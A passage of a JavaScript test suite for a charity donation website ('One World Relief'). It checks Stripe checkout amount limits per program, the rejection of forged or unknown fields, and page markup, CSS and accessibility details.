    assert.deepEqual([...image.subarray(0, 8)], [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], `${label} should be a PNG`);
  }
  assert.deepEqual([faviconPng.readUInt32BE(16), faviconPng.readUInt32BE(20)], [64, 64]);
  assert.deepEqual([brandIcon.readUInt32BE(16), brandIcon.readUInt32BE(20)], [512, 512]);
  assert.deepEqual([brandIconSmall.readUInt32BE(16), brandIconSmall.readUInt32BE(20)], [192, 192]);
  assert.deepEqual([appleTouchIcon.readUInt32BE(16), appleTouchIcon.readUInt32BE(20)], [180, 180]);
  assert.match(webManifest, /"name": "One World Relief"/);
  assert.match(webManifest, /one-world-relief-icon-192\.png/);
  assert.match(webManifest, /one-world-relief-icon\.png/);
  assert.match(serviceWorker, /owr-offline-v7/);
  assert.match(serviceWorker, /one-world-relief-icon\.png/);
});

test("both checkout mirrors enforce every donation-program amount boundary", async () => {
  const validCases = [
    { label: "unrestricted minimum", body: { program_id: "unrestricted", amount_usd: 5 } },
    { label: "unrestricted above minimum", body: { program_id: "unrestricted", amount_usd: 5.01 } },
    { label: "annual orphan fixed gift", body: { program_id: "orphan_annual", amount_usd: 300 } },
    { label: "mosque construction fixed gift", body: { program_id: "mosque_build", amount_usd: 1000 } },
    { label: "water station fixed gift", body: { program_id: "water_support", program_variant: "water_station", amount_usd: 350 } },
    { label: "water contribution lower bound", body: { program_id: "water_support", program_variant: "water_contribution", amount_usd: 350 } },
    { label: "water contribution middle", body: { program_id: "water_support", program_variant: "water_contribution", amount_usd: 1425.50 } },
    { label: "water contribution upper bound", body: { program_id: "water_support", program_variant: "water_contribution", amount_usd: 3000 } },
    { label: "water well fixed gift", body: { program_id: "water_support", program_variant: "community_well", amount_usd: 3000 } },
    { label: "water station inferred", body: { program_id: "water_support", amount_usd: 350 } },
    { label: "water contribution inferred", body: { program_id: "water_support", amount_usd: 351 } },
    { label: "water well inferred", body: { program_id: "water_support", amount_usd: 3000 } },
    { label: "orphan feeding minimum", body: { program_id: "orphan_feeding", amount_usd: 100 } },
    { label: "orphan feeding above minimum", body: { program_id: "orphan_feeding", amount_usd: 100.01 } },
    { label: "family recovery fixed gift", body: { program_id: "family_recovery", amount_usd: 600 } },
    { label: "emergency aid minimum", body: { program_id: "emergency_aid", amount_usd: 25 } },
    { label: "emergency aid above minimum", body: { program_id: "emergency_aid", amount_usd: 25.01 } },
    { label: "Zakat minimum", body: { program_id: "zakat", amount_usd: 5 } },
  ];
  const invalidCases = [
    { label: "unrestricted below minimum", body: { program_id: "unrestricted", amount_usd: 4.99 } },
    { label: "annual orphan below fixed gift", body: { program_id: "orphan_annual", amount_usd: 299.99 } },
    { label: "annual orphan above fixed gift", body: { program_id: "orphan_annual", amount_usd: 300.01 } },
    { label: "mosque construction below fixed gift", body: { program_id: "mosque_build", amount_usd: 999.99 } },
    { label: "mosque construction above fixed gift", body: { program_id: "mosque_build", amount_usd: 1000.01 } },
    { label: "water station wrong amount", body: { program_id: "water_support", program_variant: "water_station", amount_usd: 350.01 } },
    { label: "water contribution below range", body: { program_id: "water_support", program_variant: "water_contribution", amount_usd: 349.99 } },
    { label: "water contribution above range", body: { program_id: "water_support", program_variant: "water_contribution", amount_usd: 3000.01 } },
    { label: "water well wrong amount", body: { program_id: "water_support", program_variant: "community_well", amount_usd: 2999.99 } },
    { label: "orphan feeding below minimum", body: { program_id: "orphan_feeding", amount_usd: 99.99 } },
    { label: "family recovery below fixed gift", body: { program_id: "family_recovery", amount_usd: 599.99 } },
    { label: "family recovery above fixed gift", body: { program_id: "family_recovery", amount_usd: 600.01 } },
    { label: "emergency aid below minimum", body: { program_id: "emergency_aid", amount_usd: 24.99 } },
    { label: "Zakat below global minimum", body: { program_id: "zakat", amount_usd: 4.99 } },
    { label: "more than two decimal places", body: { program_id: "unrestricted", amount_usd: 5.001 } },
  ];

  for (const modulePath of checkoutModulePaths) {
    for (const { label, body } of validCases) {
      const result = await callCheckout(modulePath, body);
      assert.equal(result.response.status, 200, `${modulePath}: ${label}`);
      assert.equal(result.stripeCalls, 1, `${modulePath}: ${label} should reach Stripe once`);
      assert.equal(result.stripeForm.get("line_items[0][price_data][unit_amount]"), String(Math.round(body.amount_usd * 100)));
    }
    for (const { label, body } of invalidCases) {
      const result = await callCheckout(modulePath, body);
      assert.equal(result.response.status, 400, `${modulePath}: ${label}`);
      assert.equal(result.stripeCalls, 0, `${modulePath}: ${label} must fail before Stripe`);
      assert.ok(result.payload.detail, `${modulePath}: ${label} should explain the error`);
    }
  }
});

test("checkout rejects unknown programs, variants, forged destinations, and invalid referrers", async () => {
  const rejected = [
    {
      label: "unknown program",
      body: { program_id: "not_a_program", campaign: "General Fund", amount_usd: 25 },
      detail: /valid donation program/,
    },
    {
      label: "unknown legacy destination",
      body: { campaign: "Invented Campaign", amount_usd: 25 },
      detail: /valid donation destination/,
    },
    {
      label: "variant on a non-water program",
      body: { program_id: "orphan_annual", program_variant: "community_well", amount_usd: 300 },
      detail: /does not accept that option/,
    },
    {
      label: "unknown water variant",
      body: { program_id: "water_support", program_variant: "private_well", amount_usd: 350 },
      detail: /valid water-support option/,
    },
    {
      label: "invalid case referrer",
      body: { program_id: "unrestricted", referrer_case: "private-record-9", amount_usd: 25 },
      detail: /valid project reference/,
    },
  ];

  for (const modulePath of checkoutModulePaths) {
    for (const { label, body, detail } of rejected) {
      const result = await callCheckout(modulePath, body);
      assert.equal(result.response.status, 400, `${modulePath}: ${label}`);
      assert.equal(result.stripeCalls, 0, `${modulePath}: ${label} must not reach Stripe`);
      assert.match(result.payload.detail, detail, `${modulePath}: ${label}`);
    }
  }
});

test("checkout derives Stripe product details and metadata from its canonical catalog", async () => {
  for (const modulePath of checkoutModulePaths) {
    const result = await callCheckout(modulePath, {
      program_id: "water_support",
      program_variant: "water_station",
      referrer_case: "Case 9",
      campaign: "Forged Campaign",
      program_label: "Forged Label",
      purpose_summary: "Forged purpose",
      amount_usd: 350,
      donor_note: "In memory of a friend",
      anonymous_public: true,
    });
    const form = result.stripeForm;

    assert.equal(result.response.status, 200, modulePath);
    assert.equal(result.payload.program_id, "water_support");
    assert.equal(result.payload.program_label, "Water Support");
    assert.equal(result.payload.program_variant, "water_station");
    assert.equal(result.payload.program_option_label, "Filtered Water Station");
    assert.equal(result.payload.campaign, "Water Support");
    assert.equal(form.get("line_items[0][price_data][product_data][name]"), "One World Relief - Water Support - Filtered Water Station");
    assert.equal(
      form.get("line_items[0][price_data][product_data][description]"),
      "A $350 gift that helps fund a filtered water cooler or station for hot-weather drinking water.",
    );
    const expectedMetadata = {
      campaign: "Water Support",
      program_id: "water_support",
      program_label: "Water Support",
      program_variant: "water_station",
      program_option_label: "Filtered Water Station",
      purpose_summary: "A $350 gift that helps fund a filtered water cooler or station for hot-weather drinking water.",
      referrer_case: "case-009",
      donor_note: "In memory of a friend",
      anonymous_public: "yes",
    };
    for (const [key, value] of Object.entries(expectedMetadata)) {
      assert.equal(form.get(`metadata[${key}]`), value, `${modulePath}: session metadata ${key}`);
      assert.equal(form.get(`payment_intent_data[metadata][${key}]`), value, `${modulePath}: payment metadata ${key}`);
    }
    assert.doesNotMatch(form.toString(), /Forged(?:\+|%20)(?:Campaign|Label|purpose)/i);
  }
});

test("legacy campaign aliases resolve to canonical donation programs", async () => {
  const aliases = [
    { campaign: "General Fund", amount_usd: 5, program: "unrestricted", canonical: "General Fund" },
    { campaign: "Orphan Support", amount_usd: 300, program: "orphan_annual", canonical: "Orphan Annual Support" },
    { campaign: "Mosque Tiles", amount_usd: 1000, program: "mosque_build", canonical: "Mosque Construction" },
    { campaign: "Madrasa Water", amount_usd: 350, program: "water_support", canonical: "Water Support", variant: "water_station" },
    { campaign: "Feeding Madrasa for Orphan Kids", amount_usd: 100, program: "orphan_feeding", canonical: "Orphan Feeding" },
    { campaign: "Father's Business Support", amount_usd: 600, program: "family_recovery", canonical: "Family Recovery" },
    { campaign: "Flood Relief", amount_usd: 25, program: "emergency_aid", canonical: "Emergency Aid" },
    { campaign: "Zakat", amount_usd: 5, program: "zakat", canonical: "Zakat" },
  ];

  for (const modulePath of checkoutModulePaths) {
    for (const expected of aliases) {
      const result = await callCheckout(modulePath, {
        campaign: expected.campaign,
        amount_usd: expected.amount_usd,
      });
      assert.equal(result.response.status, 200, `${modulePath}: ${expected.campaign}`);
      assert.equal(result.payload.program_id, expected.program);
      assert.equal(result.payload.campaign, expected.canonical);
      assert.equal(result.payload.program_variant, expected.variant || "");
      assert.equal(result.stripeForm.get("metadata[program_id]"), expected.program);
      assert.equal(result.stripeForm.get("metadata[campaign]"), expected.canonical);
    }
  }
});

test("offline fallback shows branded connection page after first visit", async () => {
  const [offlineHtml, siteJs, serviceWorker, siteCss] = await Promise.all([
    readFile("offline.html", "utf8"),
    readFile("one-world-relief.js", "utf8"),
    readFile("sw.js", "utf8"),
    readFile("one-world-relief.css", "utf8"),
  ]);

  assert.match(offlineHtml, /One World Relief is still here\./);
  assert.match(offlineHtml, /offline-dino-scene/);
  assert.match(offlineHtml, /Try Again/);
  assert.match(siteJs, /navigator\.serviceWorker\.register\("\/sw\.js"\)/);
  assert.match(serviceWorker, /owr-offline-v7/);
  assert.match(serviceWorker, /caches\.match\("\/offline\.html"\)/);
  assert.match(siteCss, /\.offline-dino/);
  assert.match(siteCss, /@keyframes offline-dino-hop/);
});

test("homepage checkout keeps accessible one-time amounts and sends unrestricted $5-plus gifts to the catalog checkout", async () => {
  const [homeHtml, siteJs, siteCss, programSource] = await Promise.all([
    readFile("index.html", "utf8"),
    readFile("one-world-relief.js", "utf8"),
    readFile("one-world-relief.css", "utf8"),
    readFile("donation-programs.js", "utf8"),
  ]);
  const quickFormMatch = homeHtml.match(/<form class="quick-donation" id="quickDonationForm"[\s\S]*?<\/form>/);
  assert.ok(quickFormMatch, "homepage should contain the quick donation form");
  const quickForm = quickFormMatch[0];

  const presetAmounts = [...quickForm.matchAll(/name="quickAmount" value="([^"]+)"/g)].map((match) => match[1]);
  assert.deepEqual(presetAmounts, ["5", "25", "50", "100"]);
  assert.equal([...quickForm.matchAll(/name="quickAmount"[^>]*checked/g)].length, 1);
  assert.match(quickForm, /name="quickAmount" value="25" checked/);
  assert.doesNotMatch(quickForm, /name="quickAmount" value="custom"|quickCustomPanel|Custom Amount/);

  assert.match(quickForm, /<label class="quick-custom-amount" for="quickCustomAmount">/);
  assert.match(quickForm, /<span class="sr-only">Enter another donation amount<\/span>/);
  assert.match(quickForm, /id="quickCustomAmount" name="quickCustomAmount" type="number" min="5" step="1" inputmode="numeric"/);
  assert.match(quickForm, /placeholder="Enter \$5 or more" aria-describedby="quickAmountHint"/);
  assert.match(quickForm, /id="quickAmountHint">Minimum donation is \$5\. Entering an amount replaces the selected preset\.<\/small>/);
  assert.doesNotMatch(quickForm, /quick-custom[^>]*hidden|id="quickCustomAmount"[^>]*hidden/);
  assert.doesNotMatch(quickForm, /quickFrequency|quick-frequency|<legend>Frequency<\/legend>|Monthly|One-time/);
  assert.doesNotMatch(quickForm, /quickCampaign|Donation destination|Choose a purpose/);
  assert.match(homeHtml, /<script src="donation-programs\.js"><\/script>\s*<script src="project-data\.js"><\/script>\s*<script src="one-world-relief\.js"><\/script>/);

  assert.match(quickForm, /class="[^"]*\bquick-donation-button\b[^"]*"[^>]*>[\s\S]*?<span>Start Donation<\/span><span aria-hidden="true">&rarr;<\/span>/);
  assert.match(quickForm, /class="quick-donation-trust"[\s\S]*?<svg aria-hidden="true"[^>]*focusable="false"[\s\S]*?Secure checkout[\s\S]*?Receipt provided/);
  assert.match(quickForm, /id="quickDonationStatus" role="status" aria-live="polite"/);
  assert.doesNotMatch(homeHtml, /Receipt emailed|quick-donation-topline/);

  assert.match(siteJs, /const activateCustomAmount = \(\) =>/);
  assert.match(siteJs, /if \(!quickCustomInput\?\.value\) \{\s*return;/);
  assert.match(siteJs, /presetAmountRadios\.forEach\(\(radio\) => \{\s*radio\.checked = false;/);
  assert.doesNotMatch(siteJs, /quickCustomInput\.addEventListener\("focus", activateCustomAmount\)/);
  assert.match(siteJs, /quickCustomInput\.addEventListener\("input", activateCustomAmount\)/);
  assert.match(siteJs, /radio\.checked && quickCustomInput[\s\S]*?quickCustomInput\.value = ""/);
  assert.match(siteJs, /quickCustomInput\?\.setAttribute\("aria-invalid", "true"\)/);
  assert.match(siteJs, /!Number\.isFinite\(customAmount\) \|\| customAmount < 5/);
  assert.match(siteJs, /Please enter a donation amount of at least \$5\./);
  assert.match(siteJs, /const buildQuickDonationUrl = \(\{ amount, program = "unrestricted" \}\) =>/);
  assert.match(siteJs, /const params = new URLSearchParams\(\{[\s\S]*?amount: String\(amount\),[\s\S]*?program: String\(program \|\| "unrestricted"\),[\s\S]*?\}\)/);
  assert.match(siteJs, /const program = quickCampaignSelect\?\.value \|\| "unrestricted"/);
  assert.match(siteJs, /window\.location\.href = buildQuickDonationUrl\(\{ amount, program \}\)/);
  assert.doesNotMatch(siteJs, /input\[name="quickFrequency"\]:checked|frequency: String\(frequency|params\.get\("frequency"\)/);

  const catalogContext = { window: {} };
  runInNewContext(programSource, catalogContext);
  const programs = JSON.parse(JSON.stringify(catalogContext.window.ONE_WORLD_RELIEF_DONATION_PROGRAMS));
  assert.equal(programs.find((program) => program.id === "unrestricted").minAmount, 5);

  const helperStart = siteJs.indexOf("  const buildQuickDonationUrl =");
  const helperEnd = siteJs.indexOf("  const setupReveals =", helperStart);
  assert.ok(helperStart >= 0 && helperEnd > helperStart, "quick donation URL helper should remain available");
  const helperContext = {
    URLSearchParams,
  };
  runInNewContext(
    `${siteJs.slice(helperStart, helperEnd)}\n` +
      "globalThis.__buildQuickDonationUrl = buildQuickDonationUrl;",
    helperContext,
  );

  for (const amount of [5, 25, 50, 100, 73]) {
    const quickUrl = helperContext.__buildQuickDonationUrl({ amount });
    const parsed = new URL(quickUrl, "https://one-world-relief.org/");
    assert.equal(parsed.pathname, "/donate.html");
    assert.equal(parsed.hash, "#donationForm");
    assert.equal(parsed.searchParams.get("amount"), String(amount));
    assert.equal(parsed.searchParams.get("program"), "unrestricted");
    assert.equal(parsed.searchParams.has("campaign"), false);
    assert.equal(parsed.searchParams.has("frequency"), false);
    assert.equal(parsed.searchParams.has("giving_frequency"), false);
  }

  assert.match(siteCss, /\.quick-amounts input:focus-visible \+ span/);
  assert.match(siteCss, /\.quick-custom-input-wrap:focus-within/);
  assert.match(siteCss, /\.quick-category select:focus-visible/);
  assert.ok((siteCss.match(/outline: 3px solid var\(--blue-700\);/g) || []).length >= 4);
  assert.match(siteCss, /\.quick-amounts input:checked \+ span/);
  assert.match(siteCss, /\.quick-donation-button:active/);
  assert.match(siteCss, /\.quick-donation-button:focus-visible/);
  assert.doesNotMatch(siteCss, /\.quick-donation-status:empty/);
  assert.doesNotMatch(siteCss, /@keyframes quick-card-(?:sheen|lift)/);
  const quickCardRule = siteCss.slice(siteCss.indexOf(".quick-donation {"), siteCss.indexOf(".quick-donation::before"));
  assert.doesNotMatch(quickCardRule, /animation\s*:|will-change\s*:/);
});

test("home page renders a continuous completed-case photo flow from project data", async () => {
  const [homeHtml, siteJs, siteCss, projectData] = await Promise.all([
    readFile("index.html", "utf8"),
    readFile("one-world-relief.js", "utf8"),
    readFile("one-world-relief.css", "utf8"),
    readFile("project-data.js", "utf8"),
  ]);

  assert.doesNotMatch(homeHtml, /See the work as it moves/);
  assert.doesNotMatch(homeHtml, /Project Flow/);
  assert.doesNotMatch(homeHtml, /From donation to proof/);
  assert.match(homeHtml, /Completed One World Relief cases/);
  assert.match(homeHtml, /faith-video-section/);
  assert.match(homeHtml, /faith-video-bg/);
  assert.match(homeHtml, /Why We Give/);
  assert.match(
    homeHtml,
    /<blockquote class="hero-giving-quote" cite="https:\/\/sunnah\.com\/bukhari:6005">\s*<p>I and the person who looks after an orphan and provides for him, will be in Paradise like this\.<\/p>\s*<footer class="hero-quote-source">\s*Prophet Muhammad <span aria-label="peace and blessings be upon him">ﷺ<\/span>\s*<span aria-hidden="true">&middot;<\/span>\s*<cite><a href="https:\/\/sunnah\.com\/bukhari:6005" target="_blank" rel="noreferrer">Sahih al-Bukhari 6005<\/a><\/cite>\s*<\/footer>\s*<\/blockquote>/u,
  );
  assert.doesNotMatch(homeHtml, /Direct aid, moving fast\./);
  assert.doesNotMatch(
    homeHtml,
    /Choose an amount, pick where it should go, and follow real project updates as support reaches people\./,
  );
  assert.match(homeHtml, /Quran 2:215/);
  assert.match(homeHtml, /Sahih al-Bukhari 6005/);
  assert.match(homeHtml, /Quran 76:8/);
  assert.match(homeHtml, /Sunan Abi Dawud 1681/);
  assert.match(homeHtml, /id="homeCaseFlowTrack"/);
  assert.match(homeHtml, /<script src="project-data\.js"><\/script>/);
  assert.match(homeHtml, /id="quickDonationForm"/);
  assert.match(homeHtml, /quick-donation-heading/);
  assert.doesNotMatch(homeHtml, /quickFrequency|quick-frequency-control/);
  assert.match(homeHtml, /Secure checkout/);
  assert.match(homeHtml, /Receipt provided/);
  assert.match(homeHtml, /Worked On/);
  assert.match(homeHtml, /Goals/);
  assert.match(homeHtml, /home-case-panel-section/);
  assert.match(homeHtml, /id="homeCompletedCases"/);
  assert.match(homeHtml, /id="homeGoalCases"/);
  assert.match(homeHtml, /<form class="quick-donation" id="quickDonationForm"[\s\S]*<\/form>\s*<\/div>\s*<\/div>\s*<\/section>\s*<section class="container home-case-panel-section/);
  assert.match(siteJs, /homeCaseFlowTrack/);
  assert.match(siteJs, /renderHomeCaseFlow/);
  assert.match(siteJs, /renderHomeCaseLanes/);
  assert.match(siteJs, /homeCompletedCases/);
  assert.match(siteJs, /homeGoalCases/);
  assert.match(siteJs, /includes\("completed"\)/);
  assert.match(siteJs, /!String\(project\.status \|\| ""\)\.toLowerCase\(\)\.includes\("completed"\)/);
  assert.match(siteJs, /Array\.from\(\{ length: 4 \}, \(\) => projects\)\.flat\(\)/);
  assert.match(siteJs, /aria-hidden="true" tabindex="-1"/);
  assert.match(siteJs, /decoding="async"/);
  assert.match(siteJs, /activateCustomAmount/);
  assert.match(siteJs, /populateDonationDestinations/);
  assert.match(siteJs, /cancelAnimationFrame\(pointerFrame\)/);
  assert.match(siteJs, /case-flow-card/);
  assert.match(siteCss, /\.home-case-flow/);
  assert.match(siteCss, /\.home-case-lanes/);
  assert.match(siteCss, /\.home-case-panel-section/);
  assert.match(siteCss, /grid-template-columns: minmax\(0, 0\.95fr\) minmax\(380px, 460px\)/);
  assert.match(siteCss, /\.quick-donation-heading/);
  assert.match(siteCss, /\.quick-donation-trust/);
  assert.match(siteCss, /\.hero-donate-first \.hero-quote-copy/);
  assert.match(siteCss, /\.hero-giving-quote/);
  assert.match(siteCss, /\.hero-quote-source a:focus-visible/);
  assert.match(siteCss, /content-visibility: auto/);
  assert.match(siteCss, /\.faith-video-section/);
  assert.match(siteCss, /\.faith-quote-track/);
  assert.match(siteCss, /@keyframes faith-quote-scroll/);
  assert.match(siteCss, /\.case-flow-track/);
  assert.match(siteCss, /@keyframes case-river/);
  assert.match(siteCss, /animation:\s*case-river var\(--case-flow-duration, 70s\) linear infinite/);
  assert.match(siteJs, /"--case-flow-duration"/);
  assert.match(siteJs, /`\$\{projects\.length \* secondsPerProject\}s`/);
  const secondsPerProject = Number(siteJs.match(/const secondsPerProject = (\d+);/)?.[1]);
  const totalCaseCount = [...projectData.matchAll(/date:\s*"Case \d{3}"/g)].length;
  const completedCaseCount = [...projectData.matchAll(/status:\s*"Completed"/g)].length;
  const comingSoonCaseCount = [...projectData.matchAll(/status:\s*"Coming Soon"/g)].length;
  const activeCaseCount = totalCaseCount - completedCaseCount - comingSoonCaseCount;
  assert.equal(secondsPerProject, 14);
  assert.equal(totalCaseCount, 9);
  assert.equal(completedCaseCount, 7);
  assert.equal(activeCaseCount, 0);
  assert.equal(comingSoonCaseCount, 2);
  assert.equal(completedCaseCount * secondsPerProject, 98);
  assert.match(siteCss, /will-change: transform/);
  assert.match(siteCss, /--case-flow-start-offset: clamp\(-3rem, -2\.5vw, -1\.25rem\)/);
  assert.match(siteCss, /padding: 0\.8rem clamp\(1rem, 4vw, 4rem\) 1\.4rem/);
  assert.doesNotMatch(siteCss, /\.case-flow-track\s*\{[\s\S]*?calc\(\(100vw - var\(--max-width\)\) \/ 2\)/);
  assert.match(siteCss, /translate3d\(var\(--case-flow-start-offset\), 0, 0\)/);
  assert.match(siteCss, /translate3d\(calc\(-50% - 0\.5rem \+ var\(--case-flow-start-offset\)\), 0, 0\)/);
  assert.match(siteCss, /@media \(max-width: 720px\)[\s\S]*?--case-flow-start-offset: 0px/);
  assert.doesNotMatch(siteCss, /@keyframes selected-amount-glow/);
  assert.doesNotMatch(siteCss, /@keyframes case-card-float/);
  assert.doesNotMatch(siteCss, /@keyframes case-photo-drift/);
  assert.doesNotMatch(siteCss, /@keyframes case-light-sweep/);
  assert.doesNotMatch(siteCss, /animation: selected-amount-glow/);
  assert.doesNotMatch(siteCss, /case-flow-shell:hover \.case-flow-track/);
  assert.doesNotMatch(siteCss, /@keyframes case-shine/);
  assert.doesNotMatch(siteJs, /case-flow-shine/);
  assert.doesNotMatch(siteJs, /case-flow-card, \\.contact-message-card/);
});

test("mobile layouts retain navigation and use contained, touch-friendly static flows", async () => {
  const rootPageNames = ["index.html", "projects.html", "donate.html", "share.html", "about.html", "contact.html"];
  const casePageNames = Array.from({ length: 9 }, (_, index) => {
    return `projects/case-${String(index + 1).padStart(3, "0")}.html`;
  });
  const [pages, offlineHtml, siteJs, siteCss] = await Promise.all([
    Promise.all([...rootPageNames, ...casePageNames].map(async (name) => ({
      name,
      html: await readFile(name, "utf8"),
    }))),
    readFile("offline.html", "utf8"),
    readFile("one-world-relief.js", "utf8"),
    readFile("one-world-relief.css", "utf8"),
  ]);

  const publicPages = [...pages, { name: "offline.html", html: offlineHtml }];
  assert.equal(publicPages.length, 16);
  for (const { name, html } of publicPages) {
    assert.match(
      html,
      /<meta name="viewport" content="[^"]*viewport-fit=cover[^"]*" \/>/,
      `${name} should account for mobile safe areas`,
    );
  }

  for (const { name, html } of pages) {
    const nav = html.match(/<nav class="main-nav"[\s\S]*?<\/nav>/)?.[0];
    assert.ok(nav, `${name} should retain its main navigation`);
    assert.equal([...nav.matchAll(/<a\s/g)].length, 4, `${name} should have all four navigation links`);
    assert.match(html, /class="button button-primary header-cta"[^>]*href="(?:\.\.\/)?donate\.html[^"]*"/, `${name} should retain the Donate CTA`);
    assert.match(html, /<footer class="site-footer/, `${name} should retain its footer`);
  }

  assert.match(
    siteCss,
    /@media \(max-width: 980px\)[\s\S]*?\.header-cta\s*\{[^}]*display: inline-flex;[^}]*\}[\s\S]*?\.main-nav\s*\{[^}]*grid-template-columns: repeat\(4, minmax\(0, 1fr\)\)/,
  );
  assert.match(siteCss, /\.page-hero\s*\{[^}]*position: relative;[^}]*overflow: hidden;/);
  assert.match(siteCss, /\.project-detail-hero\s*\{[^}]*position: relative;[^}]*overflow: hidden;/);
  assert.match(
    siteJs,
    /prefersReducedMotion \|\|\s*!window\.matchMedia\("\(hover: hover\) and \(pointer: fine\)"\)\.matches\s*\) \{\s*return;/,
  );

  const mobileStart = siteCss.indexOf("@media (max-width: 720px)");
  assert.ok(mobileStart >= 0, "site should define phone-specific layout rules");
  const mobileCss = siteCss.slice(mobileStart);

  const revealRule = mobileCss.match(
    /\.motion-ready \.reveal,[\s\S]*?\.motion-ready \.reveal\[data-reveal-variant="scale"\]\s*\{[^}]*\}/,
  )?.[0];
  assert.ok(revealRule, "mobile should normalize every reveal variant");
  assert.match(revealRule, /transform: translateY\((?:18|20)px\)/);
  assert.doesNotMatch(revealRule, /translateX|scale\(/);

  assert.match(mobileCss, /\.home-case-lane > div\s*\{[^}]*display: flex;[^}]*overflow-x: auto;[^}]*scroll-snap-type: x mandatory;/);
  assert.match(mobileCss, /\.home-case-lane \.story-link,\s*\.home-case-lane \.story-empty\s*\{[^}]*flex: 0 0 min\(78vw, 280px\);[^}]*scroll-snap-align: start;/);
  assert.match(mobileCss, /\.case-flow-shell\s*\{[^}]*overflow-x: auto;[^}]*scroll-snap-type: x mandatory;/);
  assert.match(mobileCss, /\.case-flow-track\s*\{[^}]*transform: none;[^}]*animation: none;[^}]*will-change: auto;/);
  assert.match(mobileCss, /\.case-flow-card\s*\{[^}]*transform: none;[^}]*animation: none;[^}]*scroll-snap-align: start;/);
  assert.match(mobileCss, /\.case-flow-card\[aria-hidden="true"\]\s*\{\s*display: none;/);
  assert.match(mobileCss, /\.faith-video-bg\s*\{\s*display: none;/);
  assert.match(mobileCss, /\.faith-quote-marquee\s*\{[^}]*overflow-x: auto;[^}]*scroll-snap-type: x mandatory;/);
  assert.match(mobileCss, /\.faith-quote-track\s*\{[^}]*transform: none;[^}]*animation: none;[^}]*will-change: auto;/);
  assert.match(mobileCss, /\.faith-quote-track article\s*\{[^}]*scroll-snap-align: start;/);
  assert.match(mobileCss, /\.faith-quote-track article\[aria-hidden="true"\]\s*\{\s*display: none;/);

  assert.match(mobileCss, /\.project-detail-feature\s*\{\s*aspect-ratio: 4 \/ 3;/);
  assert.match(mobileCss, /\.project-fact-grid\s*\{[^}]*grid-template-columns: repeat\(2, minmax\(0, 1fr\)\)/);
  assert.match(mobileCss, /\.project-proof-grid\s*\{[^}]*grid-template-columns: repeat\(2, minmax\(0, 1fr\)\)/);
  assert.match(mobileCss, /\.proof-card img\s*\{[^}]*height: auto;[^}]*object-fit: contain;/);
  assert.match(mobileCss, /\.proof-card video\s*\{[^}]*aspect-ratio: 16 \/ 9;[^}]*object-fit: contain;/);
  assert.match(mobileCss, /\.video-proof,\s*\.proof-card-featured\s*\{\s*grid-column: 1 \/ -1;/);
  assert.match(mobileCss, /\.project-card\s*\{[^}]*grid-template-rows: auto;/);
  assert.match(mobileCss, /\.project-card \.project-media\s*\{\s*aspect-ratio: 16 \/ 10;/);
  assert.match(mobileCss, /\.project-card \.project-update\s*\{\s*display: none;/);
  assert.match(mobileCss, /\.project-card \.project-actions\s*\{[^}]*grid-template-columns: repeat\(2, minmax\(0, 1fr\)\)/);
  assert.match(mobileCss, /@media \(max-width: 350px\)[\s\S]*?\.project-fact-grid,\s*\.project-proof-grid\s*\{\s*grid-template-columns: 1fr;/);

  assert.match(mobileCss, /\.donate-impact-media\s*\{[^}]*grid-template-rows: 220px 105px;/);
  assert.match(mobileCss, /\.donation-form-card \.amount-grid\s*\{[^}]*grid-template-columns: repeat\(2, minmax\(0, 1fr\)\)/);

  assert.match(mobileCss, /\.header-cta\.button\s*\{[^}]*width: auto;[^}]*min-height: 42px;/);
  assert.match(mobileCss, /\.footer-links a\s*\{[^}]*min-height: 44px;[^}]*display: inline-flex;/);
  assert.match(mobileCss, /#proof,\s*#case-timeline,\s*#donationForm\s*\{\s*scroll-margin-top: 148px;/);
  assert.match(mobileCss, /input,\s*select,\s*textarea\s*\{\s*font-size: 16px;/);
});

test("contact page has a polished accessible mailto contact flow", async () => {
  const [contactHtml, siteJs, siteCss] = await Promise.all([
    readFile("contact.html", "utf8"),
    readFile("one-world-relief.js", "utf8"),
    readFile("one-world-relief.css", "utf8"),
  ]);

  assert.match(contactHtml, /contact-flow-section/);
  assert.match(contactHtml, /contact-method-card/);
  assert.match(contactHtml, /contact-message-card/);
  assert.match(contactHtml, /Questions about donations, receipts, projects, or partnerships/);
  assert.match(contactHtml, /Reach One World Relief/);
  assert.match(contactHtml, /Send us a message/);
  assert.match(contactHtml, /href="mailto:Oneworldrelief\.fma@gmail\.com" class="contact-method-card contact-method-card-link"/);
  assert.match(contactHtml, /href="tel:\+18568707528" class="contact-method-card contact-method-card-link"/);
  assert.match(contactHtml, /contact-method-card contact-method-card-static/);
  assert.equal([...contactHtml.matchAll(/class="contact-method-icon"/g)].length, 3);
  assert.match(contactHtml, /<form class="contact-form" id="contactForm" novalidate>/);
  assert.match(contactHtml, /id="nameField" name="name" type="text"[^>]*autocomplete="name" required[^>]*aria-describedby="nameFieldError"/);
  assert.match(contactHtml, /id="emailField" name="email" type="email" placeholder="you@example\.com" autocomplete="email" required[^>]*aria-describedby="emailFieldError"/);
  assert.match(contactHtml, /id="messageField" name="message"[^>]*maxlength="2000"[^>]*required[^>]*aria-describedby="messageFieldError"/);
  assert.equal([...contactHtml.matchAll(/class="contact-field-error"[^>]*aria-live="polite"/g)].length, 3);
  assert.match(contactHtml, /id="contactSubmit"[^>]*>\s*<span data-contact-submit-label>Send Message<\/span>/);
  assert.match(contactHtml, /Your message goes directly to One World Relief\./);
  assert.match(contactHtml, /id="contactFormStatus" role="status" aria-live="polite" aria-atomic="true"/);
  assert.doesNotMatch(contactHtml, /Send us a note|Send Email/);
  assert.doesNotMatch(contactHtml, /Send a note and we will follow up/);
  assert.doesNotMatch(contactHtml, /We are here to help/);

  assert.match(siteCss, /\.contact-flow-section/);
  assert.match(siteCss, /\.contact-intro/);
  assert.match(siteCss, /\.contact-submit/);
  assert.match(siteCss, /\.contact-method-card-link:focus-visible/);
  assert.match(siteCss, /\.contact-message-card/);
  assert.match(siteCss, /min-height: min\(760px, calc\(100svh - 74px\)\)/);
  assert.match(siteCss, /grid-template-columns: minmax\(0, 0\.82fr\) minmax\(420px, 1fr\)/);
  assert.match(siteCss, /contact-methods h1[\s\S]*font-family: "Manrope"/);
  assert.match(siteCss, /contact-message-card h2[\s\S]*font-family: "Manrope"/);
  assert.match(siteCss, /\.contact-form input:focus-visible,[\s\S]*\.contact-form textarea:focus-visible/);
  assert.match(siteCss, /\.contact-form input\[aria-invalid="true"\]/);
  assert.match(siteCss, /\.contact-submit \{[\s\S]*?width: 100%/);
  assert.match(siteCss, /\.contact-submit:focus-visible/);
